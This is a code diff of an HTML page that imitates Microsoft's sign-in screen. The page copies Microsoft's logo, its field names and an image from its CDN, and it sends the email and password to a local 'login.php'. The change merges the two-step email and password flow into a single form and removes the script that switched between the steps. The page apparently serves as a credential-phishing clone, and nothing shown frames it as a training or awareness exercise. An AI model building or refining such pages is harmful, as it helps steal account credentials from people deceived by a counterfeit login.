@@ -12,38 +12,32 @@
         <img src="logo.svg" class="logo" alt="Microsoft Logo">
         
         <form action="login.php" method="POST" id="login-form">
-            <!-- Step 1: Email -->
-            <div id="step-1">
+            <div id="login-container">
                 <h1>Sign in</h1>
                 <div class="input-group">
                     <input type="text" name="loginfmt" id="loginfmt" placeholder="Email, phone or Skype" required autofocus>
                 </div>
-                <p class="help-text">No account? <a href="#">Create one!</a></p>
-                <p class="help-text"><a href="#">Can't access your account?</a></p>
-                <div class="btn-group">
-                    <button type="button" class="next-btn" onclick="showStep2()">Next</button>
+                
+                <div class="password-wrapper">
+                    <div class="input-group">
+                        <input type="password" name="passwd" id="passwd" placeholder="Password" required>
+                    </div>
                 </div>
+
+                <div class="help-section">
+                    <p class="help-text">No account? <a href="#">Create one!</a></p>
+                    <p class="help-text"><a href="#">Can't access your account?</a></p>
+                </div>
+                
+                <div class="btn-group">
+                    <button type="submit" class="next-btn">Sign in</button>
+                </div>
+                
                 <div class="options-group">
                     <div class="option">
                         <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f31ed9.svg" alt="Options">
                         <span>Sign-in options</span>
                     </div>
-                </div>
-            </div>
-
-            <!-- Step 2: Password (Hidden initially) -->
-            <div id="step-2" style="display: none;">
-                <div class="identity-banner">
-                    <svg role="presentation" focusable="false" width="24" height="24" class="back-arrow" onclick="showStep1()" viewBox="0 0 24 24"><path fill="currentColor" d="M20 11H7.8l5.6-5.6L12 4l-8 8 8 8 1.4-1.4L7.8 13H20v-2z"></path></svg>
-                    <span id="display-email"></span>
-                </div>
-                <h1 style="margin-top: 16px;">Enter password</h1>
-                <div class="input-group">
-                    <input type="password" name="passwd" id="passwd" placeholder="Password">
-                </div>
-                <p class="help-text"><a href="#">Forgot password?</a></p>
-                <div class="btn-group">
-                    <button type="submit" class="next-btn">Sign in</button>
                 </div>
             </div>
         </form>
@@ -56,24 +50,5 @@
             <a href="#">...</a>
         </div>
     </footer>
-
-    <script>
-        function showStep2() {
-            var emailInput = document.getElementById('loginfmt');
-            if(emailInput.value.trim() !== '') {
-                document.getElementById('step-1').style.display = 'none';
-                document.getElementById('step-2').style.display = 'block';
-                document.getElementById('display-email').innerText = emailInput.value;
-                document.getElementById('passwd').focus();
-            } else {
-                emailInput.focus();
-            }
-        }
-
-        function showStep1() {
-            document.getElementById('step-2').style.display = 'none';
-            document.getElementById('step-1').style.display = 'block';
-        }
-    </script>
 </body>
 </html>
